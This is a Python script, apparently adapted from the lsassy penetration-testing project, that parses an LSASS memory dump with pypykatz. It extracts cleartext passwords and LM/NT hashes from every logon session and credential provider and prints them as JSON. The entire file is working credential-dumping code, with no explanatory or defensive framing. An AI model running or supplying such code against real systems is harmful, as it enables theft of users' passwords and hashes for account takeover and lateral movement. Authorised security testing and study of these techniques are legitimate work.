# Idea and most code from Romain Bentz (pixis - @hackanddo)
# https://github.com/Hackndo/lsassy/blob/master/lsassy/modules/parser.py
# need to pip install pypykatz

from pypykatz.pypykatz import pypykatz
import sys
import json

def main(file):
    #cred_dict= {'luid': [], 'creds': []}
    cred_dict= []
    #cred_dict = {'ssp', 'domain', 'username', 'password', 'lmhash', 'nthash'}

    dmpContents = open(file, "rb")
    pypyParse = pypykatz.parse_minidump_external(dmpContents)
    dmpContents.close()

    ssps = ['msv_creds', 'wdigest_creds', 'ssp_creds', 'livessp_creds', 'kerberos_creds', 'credman_creds', 'tspkg_creds']
    for luid in pypyParse.logon_sessions:
        for ssp in ssps:
            for cred in getattr(pypyParse.logon_sessions[luid], ssp, []):
                domain = getattr(cred, "domainname", None)
                username = getattr(cred, "username", None)
                password = getattr(cred, "password", None)
                LMHash = getattr(cred, "LMHash", None)
                NThash = getattr(cred, "NThash", None)
                if LMHash is not None:
                    LMHash = LMHash.hex()
                if NThash is not None:
                    NThash = NThash.hex()
                if (not all(v is None or v == '' for v in [password, LMHash, NThash])
                        and username is not None
                        and not username.endswith('$')
                        and not username == ''):
                    if not LMHash:
                        LMHash = "aad3b435b51404eeaad3b435b51404ee"
                    if not password:
                        password = "null"
                    creds = {'ssp':ssp, 'domain':domain, 'username':username, 'password':password, 'lmhash':LMHash, 'nthash':NThash}
                    cred_dict.append(creds)


    cred_json = json.dumps(cred_dict)
    print(cred_json)

if __name__ == "__main__":
    main(sys.argv[1])